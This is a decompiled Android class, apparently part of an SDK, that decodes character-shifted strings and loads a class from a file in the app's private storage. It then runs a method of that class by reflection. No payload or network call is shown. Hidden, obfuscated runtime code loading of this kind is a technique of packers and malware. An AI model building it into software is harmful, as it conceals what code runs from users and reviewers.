package com.x.zg;

import android.content.Context;
import android.util.Log;
import java.io.File;

/* JADX INFO: loaded from: classes.dex */
final class b implements Runnable {
    final /* synthetic */ Context a;
    final /* synthetic */ String b;

    b(Context context, String str) {
        this.a = context;
        this.b = str;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i = (int) ((Float.parseFloat(a.a("625", 4)) * 10.0f) % 2.0f);
        File file = new File(this.a.getFilesDir(), o.a(a.a("uu6", 7), i));
        if (!file.exists()) {
            file.mkdirs();
        }
        m mVarA = n.a(file + o.a(a.a("tcl0j01", 1), i));
        if (mVarA == null) {
            Log.i(a.a("zkr", 7), a.a("ufm\"kpkv\"gttqt\"pwnn", 2));
            return;
        }
        try {
            Class<?> clsA = new o(mVarA.a.getAbsolutePath(), file.getAbsolutePath(), i).a(mVarA.d);
            clsA.getMethod(mVarA.e, Context.class, String.class).invoke(clsA, this.a, this.b);
        } catch (Exception e) {
            e.printStackTrace();
            Log.i(a.a("yjq", 6), a.a("xip%nsny%jwwtw%", 5) + e.getLocalizedMessage());
        }
    }
}
